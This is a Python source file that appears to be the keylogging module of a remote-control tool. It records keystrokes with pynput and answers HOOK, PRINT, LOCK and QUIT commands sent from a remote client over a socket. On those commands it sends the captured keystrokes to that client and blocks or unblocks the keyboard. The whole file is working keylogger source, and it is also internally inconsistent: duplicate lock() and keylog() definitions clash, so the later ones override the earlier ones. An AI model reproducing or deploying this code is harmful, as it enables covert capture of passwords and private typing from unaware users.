import threading, keyboard
from pynput.keyboard import Listener

BUFSIZ = 1024 * 4


def keylogger(key):
    global cont, flag
    if flag == 4:
        return False
    if flag == 1:
        tmp = str(key)
        if tmp == 'Key.space':
            tmp = ' '
        elif tmp == '"\'"':
            tmp = "'"
        else:
            tmp = tmp.replace("'", "")
        cont += str(tmp)
    return


def _print(client):
    global cont
    client.sendall(bytes(cont, "utf8"))
    cont = " "
    return


def listen():
    with Listener(on_press=keylogger) as listener:
        listener.join()
    return


def lock():
    global islock
    if islock == 0:
        for i in range(150):
            keyboard.block_key(i)
        islock = 1
        return "The keyboard is block"
    else:
        for i in range(150):
            keyboard.unblock_key(i)
        islock = 0
    return "The keyboard is unblock"

def lock(islock):
    if islock == 0:
        for i in range(150):
            keyboard.block_key(i)
        return "The keyboard is block", 1
    else:
        for i in range(150):
            keyboard.unblock_key(i)
    return "The keyboard is unblock", 0

def keylog(client):
    global cont, flag, islock, ishook
    islock = 0
    ishook = 0
    threading.Thread(target=listen).start()
    flag = 0
    cont = " "
    msg = ""
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "HOOK" in msg:
            if ishook == 0:
                flag = 1
                ishook = 1
            else:
                flag = 2
                ishook = 0
        elif "PRINT" in msg:
            _print(client)
        elif "LOCK" in msg:
            lock()
        elif "QUIT" in msg:
            flag = 4
            return
    return

def keylog(msg, islock):
    global cont, flag, ishook
    ishook = 0
    threading.Thread(target=listen).start()
    flag = 0
    cont = " "
    msgRep = " "
    msg = msg.lower()
    if "hook" in msg:
        if ishook == 0:
            flag = 1
            ishook = 1
        else:
            flag = 2
            ishook = 0
    elif "lock" in msg:
        msgRep,islock = lock(islock)
    elif "quit" in msg:
        flag = 4
        return
    return msgRep,islock